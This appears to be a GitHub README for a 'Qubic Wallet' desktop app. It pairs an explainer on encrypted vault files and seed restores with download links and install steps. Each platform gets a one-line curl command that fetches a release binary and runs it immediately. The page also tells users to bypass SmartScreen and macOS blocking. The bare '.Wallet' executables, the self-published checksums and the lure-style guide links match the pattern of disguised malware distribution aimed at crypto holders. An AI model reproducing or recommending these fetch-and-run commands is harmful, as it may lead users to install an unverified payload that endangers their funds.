![Qubic Wallet vault file explained](assets/banner-trust.png)

# The Qubic Wallet Vault File: Encrypted Account, Not a Backup Copy

What the file on your disk is, and the two things it can never do alone.

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) - 57,942,724 B (55.3 MiB) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) - 49,066,728 B (46.8 MiB) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) - 51,287,539 B (48.9 MiB) |

The file format described is the one written by the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2).

> The vault file is the locked box. The password is the key. Keep the box and lose the key, and you own a box.

The vault file is the encrypted account material Qubic Wallet writes when you create an account: the seed, encrypted with your password, in a file named from that password's hash. Users meet it when restore flows ask for "a vault file", and the confusion is always the same - treating it as a backup of the account rather than as one half of a pair.

<!-- ARTICLE-BODY-BEGIN -->

## What is inside, and what is not

Inside is the seed, encrypted with the password that created the file. Not inside: the seed in readable form, the password itself, or any network data. The app stores no readable seed and scrubs seeds and private keys from memory after use, which is why the file is unreadable without the password rather than merely inconvenient without it.

## Why the name confuses people

Three different things get called "the vault": the file on disk, the password that opens it, and the account itself. Only the first is a file you can copy. A restore screen that asks for a vault file is asking for the first, and a seed phrase is not one, whatever the file is called.

## Copying it, keeping it, restoring it

Restoring means putting the file back where the app looks for it and logging in with that password. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-data-folder-config-backup.md">backup guide</a> covers the location on each platform and the storage habit that goes with it.

The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-restore-account-seed.md">restore walkthrough</a> covers the case where the file is gone and the phrase is not.

That restore route, seed and password together, is the only one the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current release</a> leaves open when the vault itself is damaged.

## When the file is damaged

A truncated copy, a disk error or an interrupted write can leave a vault that no longer opens. Retyping the password cannot repair it, because the file itself is the damaged half. Recovery means rebuilding the account from the seed and the password together, which is a restore rather than a repair; if either is missing, the file's damage is final. The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-forgot-password-vault-reset.md">password and reset guide</a> separates damage from a forgotten password.

## What it can never do

It cannot restore an account without its password, and it holds nothing that can substitute for one. Those two limits are the whole security model: the file is portable, the key is not stored with it, and no support channel can produce it.

## FAQ

### Is the vault file a backup of my wallet?

It is half a backup. It restores the account only together with the password that created it.

### Can I open the vault file in another wallet?

No documented route exists: it is this app's encrypted account format, not an interchange format for seeds.

### What if I copied the vault but forgot the password?

Then the pair is broken: the file cannot be decrypted, and the phrase cannot rebuild the account on its own.

### Does deleting the vault file move my funds?

No. It removes the local copy; the funds stay at addresses controlled by that seed.

<!-- ARTICLE-BODY-END -->

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet && ./qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Verify the download: `sha256sum wallet.zip`
3. Extract the archive.
4. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop.sha256` then `sha256sum qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet`
5. Mark the `.Wallet` file executable.
6. Run it.

### Published SHA-256 values (upload of 2026-11-22)

| File | Download-level SHA-256 |
| --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | `923915b18899a03f7ba5685ec653102c74293d83aa078ffa9961db4c62990cd4` |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Compare the value your command prints with the row for the file you downloaded. The second check reads the `.sha256` file shipped inside the archive, which hashes the extracted `.Wallet` binary and names it `qubic-wallet-desktop`; compare the two hashes by eye rather than running the file as a checklist, because the stored name is not the extracted file name. A mismatch at either level means stop: delete the file and download again from this repository's release page.
<!-- INSTALL-END -->

## Related guides

- [Data folder and backup](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-data-folder-config-backup.md)
- [Forgot password and vault reset](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-forgot-password-vault-reset.md)
- [Restoring from a seed](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-restore-account-seed.md)
- [Can you recover without a seed](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-recovery-without-seed-phrase.md)
- [Current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2)
